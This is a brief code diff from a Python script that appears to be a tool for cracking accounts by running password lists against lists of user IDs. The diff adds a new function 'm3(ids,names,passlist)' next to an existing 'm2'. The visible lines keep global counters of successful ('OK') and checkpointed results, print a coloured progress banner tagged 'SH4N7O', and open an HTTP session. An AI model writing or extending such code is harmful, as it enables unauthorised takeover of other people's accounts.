@@ -295,7 +295,7 @@ def m2(ids,names,passlist):
                 time.sleep(20)
         loop+=1
 
-##def m2(ids,names,passlist):
+def m3(ids,names,passlist):
         global loop,oks,cps
         sys.stdout.write(f'\r\r\033[1;37m [SH4N7O] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
